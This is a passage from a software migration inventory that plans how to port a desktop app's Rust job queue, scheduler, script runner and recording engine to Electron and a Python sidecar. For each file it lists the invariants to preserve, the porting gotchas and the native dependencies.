- The def and plan JSON shapes are durable .room data — serde's #[serde(flatten)] + tag='kind' + default-field behavior must be reproduced exactly (zod .passthrough() + defaults), including tolerating the legacy empty condition 'input' field
- The NEEDS_APPROVAL string-prefix protocol between script executor, node funnel, park_outcome and the UI label is an invisible cross-file contract
- Refusal-under-the-minting-lock is a transaction-shaped invariant: in better-sqlite3 wrap the in-flight check + job insert + run-row insert + parked-sweep in one transaction or the double-Run race returns
- Vote/route aggregation semantics are pinned by sidecar tests (test_wf_nodes.py) — the TS side must not grow a second implementation
- plan cloning cost note: the executor shares one plan object per run; a big def copied per step was a measured regression

**Native/Tauri surface:** sidecar HTTP (sidecar_json_cancellable /generate, chain-node runner with SIDECAR_CHAIN_TIMEOUT, privacy policy + Keychain provider keys injected by the sidecar gateway); tauri Window emits (workflow node events, workflows-changed); tauri Runtime-generic executor (mock-app test harness); rusqlite (artifact/file queries, LIKE escaping)

### `src-tauri/src/commands/jobs.rs` — 2786 LOC → electron-main (6 d)

Job-runner foundation: Lane enum (LocalLlm=1 slot, Cpu=4, Cloud=4), Step DAG, pure plan_dispatch/run_plan wave scheduler with checkpoint callbacks, dense_prefix resume cursor, spawn_job_runner (panic-guaranteed terminal state), park/quiesce lifecycle (PARKED_BY_LOCK/PARKED_BY_EXIT), plus the deep_summary, studio, and podcast_audio job kinds and the list/cancel/delete/resume commands. Half the file is load-bearing unit tests pinning the resume contract.

**Replacement:** TypeScript module in Electron main: run_plan/plan_dispatch/dense_prefix as pure functions (waves via Promise.all), lanes as counters, cancel via AbortController + a shared boolean, job-progress via webContents.send. The panic guarantee becomes a try/catch/finally around every runner body plus an unhandledRejection guard writing the 'error' terminal state and pumping the queue. Model calls stay on the existing sidecar endpoints.

**Must preserve:**
- run_plan dispatches waves of ready steps per-lane (local model lane is strictly serial — one resident model); lower step id wins a contested slot so runs are deterministic; cancel flag checked only BETWEEN waves
- Checkpoint persists the dense contiguous prefix of the done-set, NEVER done.len() — a branched/cloud-lane plan finishes out of order ({0,1,3} with 2 pending) and storing the count would mark unrun steps done; a done-but-above-prefix step simply re-runs because all artifacts are INSERT OR REPLACE idempotent
- There is deliberately NO Whisper/transcription lane — STT runs outside the job system
- spawn_job_runner catches panics (catch_unwind), recovers a poisoned room mutex, parks the row as 'error' with the panic reason, reports the row's own checkpointed cursor/total (never 0/0), frees the queue slot and pumps — without this a panicked runner leaves a phantom 'running' card and wedges the single slot for the session (Live QA 2026-08-03)
- cancel_job goes through the cancel TREE (children stop with the parent) and falls back to parking a 'queued' row directly since a queued job has no in-memory flag; it also closes the workflow run row or the green Running badge lives forever
- park_crashed_job refuses to rewrite a row already 'done'/'paused' — a panic in the epilogue after the terminal write must not turn a real finish into a failure
- quiesce_stale_jobs on room open: parks 'running' rows as PARKED_BY_EXIT, deliberately leaves 'queued' alone (pump_on_open auto-starts them; demoting queued once made the pump a dead no-op), then dedupes parked duplicates AGAIN (the parked rows were created after migrate's sweep) and prunes finished history
- Deep summary: one-liner sentinel policy via LinerOutcome — empty ANSWER caches the '' sentinel (auto runs only, so the scheduler terminates), failed CALL (timeout/quota/502) caches NOTHING so it retries, hard failure (OLLAMA_DOWN/MODEL_MISSING) parks the job; classify_liner is the ONE place this policy lives, shared with the workflow summarize_file node
- Resume rebuilds the deep-summary plan from CURRENT files and re-derives the cursor from the one-liner cache (stored cursor is positional and the file list may have changed); '' sentinel counts as missing for manual runs only
- Every runner is room-pinned: every read/write re-checks the current room path against the captured one, so a room closed/swapped mid-run (including across awaits during plan building) never receives the job's writes
- A Stop pressed during the final wave is only observable AFTER run_plan returns Done — the runner re-checks the cancel flag before running the reduce
- Studio/podcast/download rows are created with total=0 not 1 — a total the cursor never advances turned into the lie 'Finished — 0 of 1 steps'; live progress events carry their own numbers
- resume_job refuses child jobs (parent re-drives them) and podcast_audio (no per-turn checkpoint — Resume would re-send the whole script to the cloud voice service); resume goes through the queue (status→'queued' then submit), never 'already running' errors
- Progress labels are 1-based naming the item in flight ('Summarizing file 1 of 17…'), 'Finishing…' past the end — pinned by tests

**Gotchas:**
- Port the test suite scenarios (dense-prefix-not-count, cancel-during-final-wave, cloud-lane lossy cursor, quiesce keeps queued) — they pin contracts the types don't express
- JS has no task panics but a rejected promise inside a fire-and-forget runner is the exact same silent-wedge bug; the finally-epilogue must be structural, not per-runner discipline
- emit_progress events carry camelCase keys (jobId/label/done/total/finished/paused/failed/fileId) the frontend effects.ts pattern-matches — fileId in a terminal event force-opens the viewer, so auto jobs must never carry one

**Native/Tauri surface:** tauri::async_runtime::spawn; tauri::Window + Emitter (window.emit 'job-progress'); tauri::Manager/State<AppState>; std::panic::catch_unwind + poisoned-mutex recovery; futures_util join_all

### `src-tauri/src/commands/jobs/create.rs` — 2190 LOC → electron-main (6 d)

The 'create' job kind: billed picture/video generation for the Create page — capability pre-checks, media-shape gating against published model limits, per-variation progress, video submit/poll/download, shot-list film planning (story_film_plan/start_shot_list_job) with clip chaining, doomed-queue abandonment, and chain waiters.

**Replacement:** TS runner: fetch to the unchanged sidecar media endpoints, setInterval-free polling loop with AbortSignal, limits gating as pure functions with the ported doomed/chain tests. The shot-list planner (plan_shot_list, deterministic) and chain-gate state machine port as pure TS over the story DB tables.

**Must preserve:**
- Billed work is NEVER retried — a silent second attempt spends money twice; a failed generation stays failed and says why
- The model is checked against the live catalog BEFORE the call (capability from output_modalities, never slug match — the standing owner decision), and media shape against published limits: illegal DURATION is refused (a 400 plus, on floor-billed models, a charge for nothing) while unpublished resolution/aspect/last-frame are DROPPED silently and references truncated to the model's published max; an ABSENT limits table means 'provider declined to say' → send as asked; empty frame-slot list is a published NO
- Unset video length defaults to the CHEAPEST legal duration (several providers default to their longest = dearest)
- A prompt may be empty ONLY for a video with a first frame (models animate a still); stills always need words
- Video: /video_start then /video_status every 5s (bar alive, Stop lands within one poll) under a 20-minute ceiling — a promise the job can't sit in Activity forever, not a cost control (the provider bills regardless); finished clip fetched with an enlarged timeout (tens of MB)
- abandon_doomed_queue: when a run fails with an error that dooms the QUEUE too (insufficient credits — account-scoped; model-gone — model-scoped), queued sibling shots are abandoned with the same reason instead of failing one by one, each discovering the same fact for money
- Clip chaining: a shot that opens from the previous clip parks itself with a parked_reason PREFIX marker when the predecessor's clip doesn't exist yet; wake_chain_waiter re-queues exactly the waiters whose predecessor just landed — a user's own pause carries no marker and is never resumed behind their back
- Attachments refuse non-picture files loudly (a model handed a PDF ignores it and returns something else — read as disobedience)
- Bulk shot-list enqueue bypasses the queue cap per-row (bulk=true) but the whole list is one review-sheet gesture; each variation is its own provider call so the bar advances per finished picture
- require_web_access at creation — generation is always off-Mac

**Gotchas:**
- Every 'drop vs refuse' choice is a billing decision with a written rationale — 'simplifying' to consistent refusal or consistent dropping changes what users are charged for
- The parked_reason prefix marker doubles as chain-waiter protocol AND user-facing sentence; wake logic matches on the prefix — renaming the sentence breaks waking
- The doomed-scope classifier parses provider error strings (OpenRouter credit/endpoint messages) — brittle by nature, keep the test corpus
- Ollama files models under literal strings (memory: one capital bricks a -cloud model) — model ids must pass through untouched

**Native/Tauri surface:** sidecar HTTP (/image_generate, /video_start, /video_status, sidecar_json_timeout for the clip download; sidecar injects privacy policy + provider keys); tauri Window/Emitter; capabilities_for/limits_for catalog modules

### `src-tauri/src/commands/jobs/script_run.rs` — 1963 LOC → electron-main (5 d)

The script runner behind the workflow script_run node: resolves a .py/.js room file, parses its comment manifest (# room-inputs/outputs/deps/timeout, PEP-723), picks an interpreter (uv > python3 for deps-free py; node for deps-free js), materializes inputs into a 0700 throwaway workspace, executes with a minimal env in its own process group, ring-buffers output tails, auto-installs missing Python modules (bounded heal loop), and imports declared+new outputs back through the versioned store only after exit 0.

**Replacement:** TS in Electron main with child_process.spawn({detached:true}) and process.kill(-pid, 'SIGTERM'/'SIGKILL') for group kills; fs.mkdirSync(dir, {mode:0o700}); manifest parsing/interpreter policy/ring tails as pure TS. Keep in Node, not the sidecar: it is process supervision, not model/document work, and the sidecar must stay killable without orphaning user scripts.

**Must preserve:**
- A spawned interpreter can NEVER read the encrypted room DB — the workspace materialization/import-back dance IS the security model; the env never carries the room path or key
- Transactional from the room's view: room mutations happen only in the import-back phase after exit 0 — Stop/kill/timeout/crash never leaves a partial room write; the workspace is deleted in the epilogue on EVERY outcome, with a startup sweep for crash orphans
- script_fingerprint (SHA-256 of bytes) is the consent unit; resolve_script_file is the ONE resolver shared with consent stamping and the consent card so the three can't disagree
- Interpreter policy is pure and matrix-tested: uv runs everything Python; deps without uv is a refusal naming the fix; JS with deps is refused; probes use absolute candidates then a zsh -ilc login-shell fallback, cached KEYED ON the app's downloaded-runtimes PATH prefix (a plain OnceLock hid a mid-session uv download and kept refusing)
- App-provisioned runtimes are probed AHEAD of system copies
- Auto-heal: parse ModuleNotFoundError stderr for a plain package token (never shell out with anything odd), install, retry — max 8 rounds, under a TOTAL wall-clock budget (a multiple of the script timeout; eight full 10-minute retries once held the single job slot for over an hour)
- Kill = SIGTERM to the process group, 5s grace, SIGKILL; 2s reader flush grace; stdout/stderr kept as 32KB ring tails
- New-file import caps: 20 files, 64MB each; name-referenced room files auto-materialize up to 20 (reads beyond the cap need explicit # room-inputs)
- Two node modes: 'import' (artifact = run report JSON) and 'transform' (upstream {{input}} → STDIN, STDOUT → artifact — a deterministic pipe stage between LLM nodes)
- Timeout clamped 5s–3600s, default 600s (first uv run downloads wheels)

**Gotchas:**
- The zsh -ilc probes are the documented TCC trap (macOS attributes everything .zshrc touches to the app — see the App Data prompt loop); the rewrite should prefer the provisioned-runtimes prefix and static paths, keeping the login-shell probe as the last resort it already is
- detached:true + negative-pid kill is the Node equivalent of the pgid dance but readers must drain via streams with their own flush grace or tails truncate
- Consent parking (NEEDS_APPROVAL marker prefix on errors) is matched by the workflow runner — the marker string is a cross-file contract
- Materialized filenames go through safe_name; scripts reference room files by NAME, so name collisions between rooms' files and workspace paths are handled here, not in the caller

**Native/Tauri surface:** std::process::Command + unix CommandExt (process-group setup); libc kill on the pgid (SIGTERM/SIGKILL); PermissionsExt mode 0700; tauri app_cache_dir() for script-runs/<job_id>/ workspaces; zsh -ilc login-shell probes

### `src-tauri/src/commands/jobs/file_pass.rs` — 1660 LOC → electron-main (4 d)

The whole-file pass: exhaustive windowed map (32K-char windows, 400 overlap, chained with a carried thread) → per-section compose (6 windows/section, merge mode only) → deterministic publish, guaranteeing every character passes through the model. Also drive_file_pass, which runs a pass INLINE as a workflow node's child job.

**Replacement:** TS: build_pass_steps + artifact store as pure/DB code, step executor as fetch calls to the unchanged sidecar endpoints, publish via the TS file-write path. smart_filter/partition_windows come from the extraction module's port and must be byte-identical.

**Must preserve:**
- Window/section sizes are measured constants (44-doc/116-run sweep: 32K halves window count for ~4% recall loss; 6-window sections because a global model fold collapsed on a small model and lost an 850KB book's chapters) — the NO-global-fold rule is a hard invariant
- The plan (window byte-spans into smart_filter'ed text + text_len + sha256) is IMMUTABLE on the jobs row; artifacts align with step ids so a resume must never re-derive different windows
- Map steps are CHAINED (each depends on the previous — the ordered read with carried thread); compose steps depend on their section's windows; publish depends on all composes — build_pass_steps is pure and shared by start and resume
- Model prompts and byte clamps live in the sidecar's /file_pass_map and /file_pass_section endpoints (MIGRATION Phase 3) — Rust only slices windows, stores artifacts, and publishes
- is_fatal distinguishes park-worthy errors (server down/model gone) from per-window failures
- drive_file_pass reuses a resumable child row whose stored plan is byte-identical (otherwise every workflow pause/resume minted a second child and re-read from window 0), runs on the PARENT's cancel flag, and returns Err("STOPPED") on cancel so the workflow parks cleanly
- Publish is idempotent and modelless; progress labels name the exact character span being read
- Cloud lane makes the dense-prefix cursor LOSSY (a finished out-of-order compose re-runs after a pause — another billed call, overwriting its idempotent artifact) — documented as the accepted design, pinned by a test in jobs.rs

**Gotchas:**
- smart_filter's OUTPUT is part of the durable resume format (length+sha256 gate) — any TS port that normalizes newlines or trims differently makes EVERY paused pass in every existing room unresumable; the Rust tests pin the exact filtered string, port them first
- Byte spans index into the filtered text as UTF-8 BYTES; JS string slicing is UTF-16 code units — slice on Buffer, not String, or windows shift on any non-ASCII file
- The malformed-sidecar-reply trap: a bad deserialize must not become an empty artifact with skipped=false (tests pin this)

**Native/Tauri surface:** sidecar HTTP (sidecar_json_cancellable /file_pass_map, /file_pass_section); tauri Runtime-generic AppHandle (mock-drivable); rusqlite artifact reads/writes

### `src-tauri/src/db/jobs.rs` — 1175 LOC → electron-main (3 d)

Persistence for jobs and job_artifacts: CRUD, checkpoints, the five-status lifecycle with parked_reason, parent/child job trees, work_identity-based dedupe of parked rows, finished-history pruning (50 per identity, 50 runs per workflow), and observability events for every real transition.

**Replacement:** TS repository over better-sqlite3-multiple-ciphers: statements port nearly 1:1; info.changes from .run() replaces conn.changes() for the phantom-transition gate; wrap dedupe/prune/insert-funnel in transactions. The schema (jobs, job_artifacts) migrates with the .room converter unchanged — plan/state stay opaque JSON text.

**Must preserve:**
- Statuses are EXACTLY queued/running/paused/error/done — a parked job is a PAUSED job that explains itself (parked_reason), deliberately NOT a sixth status: every selector (unfinished_jobs, pump, dedupe, retire) already knows five, and a sixth once left a workflow stuck for good
- set_job_status clears parked_reason on every status except 'paused' (a recovered/finished job must not keep explaining an interruption it survived); mark_job_parking stamps only rows still reading live; park_job writes 'paused'+reason directly (bypassing set_job_status to preserve the reason) and logs its own transition
- Transition logging is gated on conn.changes()>0 — an UPDATE matching no row is a successful statement that moved nothing, and logging a phantom 'done' is fabrication; events carry NO room content (title/error words must not leak; error is classified e.g. err=not_found)
- work_identity: workflows collapse by workflow_id (trigger/prev_run_at vary per run), auto-index jobs by the fixed 'deep_summary\u{1f}auto' key (each snapshot's missing-set differs), everything else by kind+title+re-serialized plan; manual 'Room summary' is deliberately NOT folded (asked for by name)
- retire_superseded_parked runs at the create_job insert funnel (a new job supersedes the parked attempt it repeats); a UNIQUE index would be wrong — it would make pausing a job an ERROR whenever a matching parked row existed, losing the checkpoint; dedupe_parked_jobs (room open) keeps the NEWEST parked row per identity (its plan matches the room as it is now) and is idempotent
- Children (parent_job_id set) are invisible to list_jobs/unfinished_jobs, exempt from the supersede guard, and delete_job_tree removes them with their parent
- delete_job first closes the workflow_runs row as 'paused' (only the runner epilogue ever closed one — deleting a running workflow otherwise left a green Running badge forever) and deletes artifacts
- put_job_artifact is INSERT OR REPLACE guarded by WHERE EXISTS(job) — a step finishing after its job was deleted stores nothing rather than an orphan row; get returns Option
- prune_job_history: only 'done' top-level rows past the newest 50 of their identity AND not named by a surviving workflow_runs row; closed runs prune to 50 per workflow, an OPEN run is never swept; unreadable plans are never counted against another identity
- unfinished_jobs orders by created_at ASC, rowid ASC — the rowid tiebreak IS the FIFO for same-second rows (deliberately untested; SQLite happens to return rowid order anyway)

**Gotchas:**
- work_identity re-serializes the plan through the JSON library before comparing — serde_json and JSON.stringify order object keys differently (serde preserves insertion order too, but the TEXT stored by the Rust writer is the comparison baseline for old rows); compare canonical parsed values, not strings, or every legacy parked row reads as distinct work
- The \u{1f} unit-separator in identity keys is durable only in memory (never stored) — but the identity FUNCTION's outputs must match across the Rust and TS eras for the dedupe of pre-migration rows to work
- The obs log's no-content rule (test greps for the job's own words) is a privacy invariant, not a style choice

**Native/Tauri surface:** rusqlite over the SQLCipher room DB; uuid v4 ids; strftime('%Y-%m-%dT%H:%M:%SZ') UTC timestamps; crate::obs event log

### `src-tauri/src/commands/jobs/rec_read.rs` — 1046 LOC → electron-main (3.5 d)

The 'rec_read' job kind: the room reads a recording's transcript in windows of WHOLE speaker turns (~12K chars) and writes chapters/highlights/notes into the recording meta. A simpler file_pass: chained map steps, NO compose — the reduce is merge_findings, ordinary code.

**Replacement:** TS: partition_turns/window_text/merge_findings/note_kind as pure functions with the ported tests; the map step calls the unchanged sidecar /rec_read_map; publish writes through the TS recording-meta editor. The turn-number-to-time resolution is plain code and ports 1:1.

**Must preserve:**
- THE MODEL NEVER STATES A TIME: it answers with the turn NUMBER shown to it (#12); merge_findings resolves that to the turn's real centisecond and DROPS numbers outside the window — a hallucinated timestamp cannot exist, worst case is a finding on the wrong real moment
- Turns are atomic — a turn is never split across windows (half a sentence in two windows is read twice, understood neither time)
- No model fold may be reintroduced (file_pass's collapsed-fold history is cited as the reason the reduce is code)
- Guardrails: MIN_CHAPTER_GAP_CS=30s merges over-eager chapters; MAX_PER_WINDOW=12 caps findings per kind so the tabs don't become a second transcript
- ReadPlan fingerprints the transcript; a resumed job that finds different words refuses rather than writing findings about a transcript that no longer exists (turns_moved/visible_chars)
- Publish resolves and writes through edit_rec_meta with a ReadStamp; runs automatically when a recording stops, in background for pre-existing recordings (via the auto_index tick), and from the Read button; reading_now() lets the UI show the in-flight state
- start_rec_read refuses politely when queued already/no transcript/at capacity — auto_index depends on Err meaning 'nothing spent this tick'
- Its runner MUST call finish_and_pump — shipping without it once wedged every later job (the queue.rs source-scan test exists because of this file)

**Gotchas:**
- The turn-number indirection is the anti-hallucination design — a rewriter who lets the model emit timestamps 'because it's simpler' reintroduces the exact fabrication class this file exists to prevent
- Coupled to the recording subsystem's meta shape and edit funnel; sequence after that port
- Auto-trigger paths are threaded through auto_index's single-waiter rule — do not give rec_read its own scheduler

**Native/Tauri surface:** sidecar HTTP (/rec_read_map, carries ollama resolved_base_url); tauri Runtime-generic handle; recording meta types (RecMeta/RecChapter/RecNote/By)

### `src-tauri/src/commands/jobs/queue.rs` — 531 LOC → electron-main (2 d)

The single-slot job queue: DB status='queued' IS the queue (FIFO by created_at+rowid), AppState.running_job is the one slot, and start_job_from_row is the ONE dispatcher (pump, resume, scheduler) that rebuilds any job kind's plan from its row and spawns its runner.

**Replacement:** Same TS module as the runner core: the slot is a plain variable (Node is single-threaded, no mutex), the dispatcher a switch on job.kind. Recreate the every-runner-frees-the-slot invariant as a unit test over a runner registry (each registered kind must resolve through a shared finally that frees+pumps) instead of source-text scanning.

**Must preserve:**
- MAX_QUEUED=10 cap; an UNREADABLE jobs table counts as FULL, never empty — guessing 'there's room' is exactly when a runaway scheduler piles up work
- One shared QUEUE_FULL sentence for every job kind
- try_reserve is compare-and-swap None→Some on the single slot; finish_and_pump (called from EVERY runner epilogue) frees it only if this job holds it, then pumps
- pump loops over poisoned rows: a start failure marks the row 'error' and continues so a bad head never head-of-line-blocks; Started::Stuck (couldn't even record the failure) stops the pump instead of spinning at full speed on the same row
- slot_free_for_this_room releases a slot held by a job the CURRENT room has never heard of (room was swapped; the old job's cancel can take minutes inside a model call) — its own epilogue becomes a harmless no-op
- start_file_pass_row refuses to resume unless the re-filtered text matches the stored plan on BOTH length and sha256; the lane/model are re-resolved from the room's CURRENT model, so one stored plan can run local (exact cursor) or cloud (lossy cursor) across a pause
- start_deep_summary_row: an auto job with nothing left finishes synchronously (Ok(false)) — status 'done', terminal event, no runner — and the caller pumps on
- Workflow resume seeds the REAL done-set from job.state.done (a branched plan cannot use a dense cursor)
- Studio/podcast/download/create rows re-spawn from scratch (atomic units, no cursor)
- A source-scan test (include_str! of the four runner files) asserts every runner that owns its epilogue calls finish_and_pump — rec_read once shipped without it and wedged every later job

**Gotchas:**
- The include_str! source-scan test cannot port literally; if the invariant isn't made structural (shared epilogue wrapper) it will silently regress
- The Started 4-way outcome (Runner/Immediate/Poisoned/Stuck) encodes who frees the slot and whether to keep pumping — collapsing it to a boolean recreates either the spin-loop or the wedge

**Native/Tauri surface:** tauri::AppHandle/Manager; tauri::async_runtime::spawn (pump_on_open)

### `src-tauri/src/commands/jobs/scheduler.rs` — 334 LOC → electron-main (2 d)

Generation-pinned workflow scheduler: one 30s tick loop per unlocked room, DST-aware next_run_after (interval/daily/weekly 'D HH:MM'), at-most-one catch-up at unlock, and the missed-vs-late distinction.

**Replacement:** TS with setInterval(30s) and a generation counter; next-run math with Luxon (DateTime.fromObject with zone, .isValid catches the DST gap, earliest offset preference for ambiguity). Keep timestamps as the same UTC strftime strings — they live in .room files.

**Must preserve:**
- Generation stamp: open_room/create_room bump sched_generation and spawn one loop carrying the stamp; a stale loop exits, so at most one scheduler is ever live
- Schedules fire ONLY while app open + room unlocked; a slot missed while closed gets AT MOST ONE catch-up at unlock and only if the schedule opted in (sched.catch_up); approval gates never apply to scheduled runs (pre-consented at activation)
- is_missed compares due-time against watching_since = the START of the PREVIOUS tick, deliberately NOT a lateness threshold: a slot that fell while the machine slept was never looked at, is merely LATE, and a late run still runs; a slot the loop watched and did not fire (workflow was a draft / schedule off) is MISSED and is skipped (next_run advanced) unless catch_up
- next_at_time skips a DST spring-forward gap to the next valid day and takes the earliest of an ambiguous fall-back time; times are LOCAL, stored as UTC ISO strings
- fire(): an empty job id from start_workflow_run means skipped (in-flight or queue full) — advance the schedule WITHOUT recording a phantom run; a failed start still advances so the loop doesn't hammer every tick
- Unreadable timestamps are never evidence of a miss

**Gotchas:**
- JS Date silently shifts nonexistent DST times instead of failing — naive porting fires the 02:30 daily run at the wrong instant or twice; use a real tz library and port the dst_gap_day test
- watching_since must be captured BEFORE the tick runs (the previous look's start), not after — off-by-one here silently drops runs the user was owed
- The stored param formats ('30', '08:00', '5 16:00' with 0=Sunday) are durable data in existing rooms

**Native/Tauri surface:** tauri::AppHandle/Manager; tauri::async_runtime::spawn + tokio::time::sleep; chrono Local/Utc timezone math

### `src-tauri/src/commands/jobs/download.rs` — 274 LOC → electron-main (1.5 d)

The 'download' job kind: a URL fetch (web::download_to_temp) or yt-dlp media pull as a single atomic background job with 0–100 byte progress, cancel, and import through the one import_download funnel.

**Replacement:** Thin TS runner over the download engines (which the web/yt-dlp subsystem rewrites separately — Node fetch streaming with byte caps, yt-dlp child process). URL parse via the WHATWG URL API.

**Must preserve:**
- Refused at CREATION when the room's internet switch is off or the URL fails the public-HTTP guard — never queue a job whose only outcome is a forbidden reach; the full (DNS) guard runs again inside the engines
- Row total=0 (the cursor never advances; total=100 once produced 'Finished — 0 of 100 steps'); the live event carries its own 0–100 percentage and a fetch with no declared length keeps its bar at zero rather than inventing one
- Title = filename for plain fetches, host for media URLs, raw string as last resort
- Media engine gets no format picker (background = best quality), cleans up its work_dir; both engines emit 'Sealing into the room…' at 99%
- Stop mid-download surfaces as the engine's error but is normalized to a clean Paused when the cancel flag is set; resume re-downloads from scratch
- A source-pin test asserts the create_job call ends in ', 0)?;'

**Gotchas:**
- Depends on the SSRF guard, the 800MB cap and yt-dlp self-update logic owned by other files (web/fetch.rs, ytdlp.rs) — owner decision 2026-08-22: cap stays 800MB, never downgrade quality to fit
- TooLarge is a distinct outcome with its own sentence, not an error string from the engine

**Native/Tauri surface:** tauri Window/Emitter; reqwest::Url parsing; delegates to web::download_to_temp (MAX_DOWNLOAD_BYTES cap) and download_media_to_temp (yt-dlp)

### `src-tauri/src/commands/jobs/auto_index.rs` — 263 LOC → electron-main (1.5 d)

Always-on indexing scheduler: every ingest event (import/OCR/STT) bumps a generation and spawns one debounced (~30s) waiter that runs the pure auto_index_decision — quiet filler for ≤5 missing files, one visible resumable 'Indexing new files' job above that, bounded retry (10×60s) while busy, skip when off/no model.

**Replacement:** TS debounced waiter (setTimeout + a generation integer); busy probes read the cancel registries the TS runner core keeps; model probe via the existing Ollama HTTP list. The decision function ports verbatim with its exhaustive test.

**Must preserve:**
- OFF means OFF: setting_on=false returns Skip unconditionally — it once returned QuietFiller ('byte-for-byte today's behavior') and the switch kept describing files with the toggle off
- Generation check (mine()) re-run after EVERY await (debounce sleep, model probe, rec-read attempt) — a later ingest re-arms and owns the run
- One unread recording per tick rides the SAME waiter (integration decision: no second scheduler, ever) and is gated by the same setting; only a rec-read that actually STARTED earns the early return — a refused start falls through to the summary sweep or every later import goes undescribed
- StartJob first deletes every UNFINISHED auto job (the fresh missing-set plan strictly supersedes a parked one) so stale Resume cards don't stack; errored auto jobs are handled by db-level work_identity dedupe instead
- Busy (streaming answer or live job) wins over 'no model' — availability is re-checked on the retry
- Quiet filler is invoked with delay 0 because this waiter already debounced (the filler's own 45s head start would stack)

**Gotchas:**
- The decision-order (off → busy → no-model/none-missing → size threshold) is pinned by tests; reordering changes user-visible behavior
- files_missing_summary must keep excluding ''-sentinel files or the scheduler loops forever on undescribable files — the sentinel policy lives in the runner core, not here

**Native/Tauri surface:** tauri::AppHandle/Manager; tauri::async_runtime::spawn + tokio sleep; atomic generation counter in AppState

**Subsystem risks:**
- Invariant density: this subsystem's correctness lives in comments and ~150 unit tests (dense-prefix vs count, five-statuses-only, parked_reason lifecycle, queued-never-parked, refusal-under-the-minting-lock), not in types — a rewrite that ports signatures but not the test scenarios will look done and regress silently; budget explicit test-porting time in every file's estimate.
- Durable-format traps in existing .room files: workflow definition JSON (serde tag/flatten/default semantics), job plan/state JSON, schedule param strings, and above all the file_pass resume gate hashing smart_filter's OUTPUT — a TS smart_filter differing by one trim/newline makes every paused pass unresumable; either port it byte-exactly (with the pinned-string tests) or ship the migration note that paused passes restart once.
- The panic-guarantee must be re-engineered, not translated: Rust's catch_unwind + poisoned-mutex recovery becomes try/catch/finally plus an unhandledRejection backstop in Node; if any runner path can reject without reaching the shared epilogue, the single queue slot wedges for the session — the exact class of bug this code documents twice (spawn_job_runner header, rec_read's missing finish_and_pump). Make the epilogue structural (one wrapper all runners go through) and test it.
- Concurrency model shift: Rust guards (room mutex, running_job mutex, atomic generation stamps) mostly vanish in single-threaded Node, but the transaction-shaped invariants remain — in-flight/queue-cap re-check + job insert + run-row insert + parked-sweep must be one better-sqlite3 transaction, and sync DB calls on the Electron main thread must stay out of hot loops or the whole UI's IPC stalls.
- Cross-subsystem coupling: this group calls extraction (smart_filter/partition_windows), ollama probes/best_default, studio core, render_podcast_audio, web download engines + yt-dlp, import_download, capabilities/media_limits, the cancel tree, obs logging, and recording meta editing — the job runner is the hub; it cannot be ported and verified before those seams have at least stub-stable TS interfaces. Sequence it mid-to-late.
- db/workflows.rs (workflows/workflow_runs/schedules tables, due_schedules, finish_workflow_run_by_job, set_workflow_run_status_by_job) is OUTSIDE this inventory's file list but load-bearing for workflow.rs, scheduler.rs and even db/jobs.rs (delete_job closes run rows) — confirm the db inventory group claims it or it is a coverage gap.
- Billing-behavior sensitivity: create.rs's refuse-vs-drop matrix, never-retry rule, doomed-queue abandonment, and the accepted lossiness of the cloud-lane dense-prefix cursor (a finished compose re-runs = a re-billed call) are OWNER-DECIDED money behaviors; a well-meaning port that 'improves' checkpointing or retries changes what users pay.
- Scheduler time semantics (Local-tz next-run with DST gap/ambiguity handling, missed-vs-late keyed on the previous tick's start, at-most-one opt-in catch-up, silent non-manual refusals that still advance next_run_at) are subtle and easy to flatten into 'node-cron', which supports none of them — hand-port with a real tz library and the existing test matrix.
- Script-runner security invariants must survive: 0700 workspace, env without room path/key, imports only after exit 0, SHA-256 consent parking on changed bytes, process-group SIGTERM/SIGKILL, total heal budget — and the zsh -ilc interpreter probes intersect the known macOS TCC attribution trap; prefer provisioned/static paths in the Electron era.
- Event-contract freeze: job-progress payload keys (jobId/done/total/finished/paused/failed/fileId — fileId auto-opens the viewer), workflow node events, workflows-changed, and the NEEDS_APPROVAL error-prefix protocol are unwritten contracts with the React frontend; rewiring src/api.ts to ipcRenderer must carry them unchanged or Activity/auto-open/park labels break in ways no backend test sees.

## 3. Recording, audio & STT

Recording/audio/STT subsystem: a live meeting recorder (mic lane pushed from the WebView + system-audio lane via ScreenCaptureKit) with one engine thread per session that mixes both lanes onto a shared 16 kHz timeline, runs Silero VAD (energy-gate fallback) per lane, decodes phrases on a dedicated whisper.cpp (Metal) thread with a sticky-language policy, diarizes meeting voices with a bundled TitaNet-small ONNX (tract) + custom clustering/naming/split logic, cross-recognizes saved voices, suppresses mic echo of the meeting, live-translates via the local LLM, and persists WAV+meta into the encrypted room DB via crash-safe checkpoints. Around it: offline retranscribe, transcript editing (cuts/corrections/notes/chapters/highlights via a single serialized edit path), streaming dictation with LLM shaping, Whisper model download/delete lifecycle, waveform peaks, AVFoundation media probing, a Range-serving roommedia:// protocol, TTS proxying, and OpenRouter media-generation limit tables. 37 tauri commands, ~15.7k LOC. Rewrite splits: the whole audio/model pipeline (engine, VAD, diarization, whisper, probing, peaks) goes to the Python sidecar (pywhispercpp, onnxruntime, PyObjC AVFoundation); the command surface, model download, session registry, media streaming protocol and limits tables go to Electron main; ScreenCaptureKit is replaced by Electron's getDisplayMedia loopback in the renderer. Total ~52 senior-dev days.

### `src-tauri/src/recording.rs` — 5392 LOC → python-sidecar (12 d)

The live-recording engine (ADD-27): one thread per session owns two capture lanes (mic pushed over IPC, system audio from SCK), mixes them onto one 16 kHz f32 timeline, segments speech with Silero VAD (energy fallback), dispatches finals/partials to a single whisper decode thread, applies sticky-language locking per lane, drops mic echoes of meeting audio, clusters/relabels speakers live, live-translates finished sentences, and persists WAV+meta into the room DB via checkpoint/full/transcript-only saves. Also the pure offline twin `retranscribe`, WAV encode/decode, cut splicing, transcript_text rendering, and resampling.

**Replacement:** A Python asyncio/threaded engine in the sidecar: numpy mixed timeline, silero-vad ONNX via onnxruntime for the VAD (same FRAME=512/hysteresis constants), pywhispercpp for decode on a dedicated thread, and a persistence contract that streams checkpoint PCM + meta JSON to Electron main (which owns the DB) over the sidecar HTTP/WS channel. Renderer mic PCM should go straight to the sidecar (WebSocket), not through Electron IPC base64.

**Must preserve:**
- Timeline is contiguous: pause stops capture, resume appends; positions are 16 kHz sample indices internally, centiseconds at the API; lanes re-anchor to the head after a LANE_RESYNC_GAP (0.5 s) because the sys tap takes seconds to start (and after every resume) — without it meeting speech is filed seconds early
- checkpoint_mark: checkpoints may only cover up to the lower lane write_floor, never the head — a lane a batch behind still owes samples below the head; a dead lane must not stall checkpoints forever (mic-only recordings)
